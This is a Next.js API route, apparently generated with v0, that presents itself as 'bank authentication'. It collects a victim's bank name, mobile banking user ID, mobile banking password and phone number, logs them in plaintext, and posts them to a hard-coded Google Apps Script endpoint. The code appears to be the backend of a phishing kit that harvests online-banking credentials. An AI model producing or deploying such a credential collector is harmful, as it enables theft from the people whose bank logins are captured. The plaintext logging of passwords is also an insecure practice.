import { NextResponse } from "next/server"

const GOOGLE_APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz11_0CbajNjip4VjZdDVmZiBjw-bEylflcQhX77AO0M2NAB-o-jpRVJB_q9n0Y6UHF/exec"

export async function POST(request: Request) {
  console.log("[v0] === BANK AUTHENTICATION API ROUTE DEBUG ===")
  console.log("[v0] Timestamp:", new Date().toISOString())

  try {
    const body = await request.json()
    console.log("[v0] Received data:", JSON.stringify(body, null, 2))

    const dataForGoogleScript = {
      formType: "bankAuthentication",
      bankname: body.bankName, // Frontend sends 'bankName', not 'bankname'
      otherbankname: body.otherBankName || "", // Handle other bank name properly
      bankingmobileid: body.mobileBankingUserId, // Frontend sends 'mobileBankingUserId'
      bankingmobilepassword: body.mobileBankingPassword, // Frontend sends 'mobileBankingPassword'
      phone: body.telephoneNumber, // Frontend sends 'telephoneNumber'
    }

    console.log("[v0] Data being sent to Google Apps Script:", JSON.stringify(dataForGoogleScript, null, 2))
    console.log("[v0] Making request to:", GOOGLE_APPS_SCRIPT_URL)

    const response = await fetch(GOOGLE_APPS_SCRIPT_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(dataForGoogleScript),
      redirect: "follow",
    })

    console.log("[v0] Response status:", response.status)
    console.log("[v0] Response headers:", Object.fromEntries(response.headers.entries()))

    if (!response.ok) {
      console.error("[v0] Response not OK:", response.status, response.statusText)
      throw new Error(`HTTP error! status: ${response.status}`)
    }

    const result = await response.text()
    console.log("[v0] Raw response:", result)

    let parsedResult
    try {
      parsedResult = JSON.parse(result)
      console.log("[v0] Parsed response:", parsedResult)
    } catch (parseError) {
      console.error("[v0] Failed to parse response as JSON:", parseError)
      console.log("[v0] Response was:", result)
      throw new Error("Invalid JSON response from Google Apps Script")
    }

    if (parsedResult.success) {
      console.log("[v0] ✅ Bank authentication submitted successfully")
      return NextResponse.json({ success: true, message: "Bank authentication submitted successfully!" })
    } else {
      console.error("[v0] ❌ Google Apps Script returned error:", parsedResult.message)
      return NextResponse.json({
        success: false,
        message: parsedResult.message || "Unknown error from Google Apps Script",
      })
    }
  } catch (error) {
    console.error("[v0] === BANK AUTHENTICATION API ERROR ===")
    console.error("[v0] Error type:", error.constructor.name)
    console.error("[v0] Error message:", error.message)
    console.error("[v0] Error stack:", error.stack)

    let errorMessage = "An unexpected error occurred"

    if (error.message.includes("fetch")) {
      errorMessage = "Network error: Unable to connect to Google Apps Script. Please check your internet connection."
    } else if (error.message.includes("JSON")) {
      errorMessage = "Data format error: Invalid response from server."
    } else if (error.message.includes("HTTP error")) {
      errorMessage = `Server error: ${error.message}`
    }

    return NextResponse.json(
      {
        success: false,
        message: errorMessage,
        debug:
          process.env.NODE_ENV === "development"
            ? {
              error: error.message,
              stack: error.stack,
            }
            : undefined,
      },
      { status: 500 },
    )
  }
}
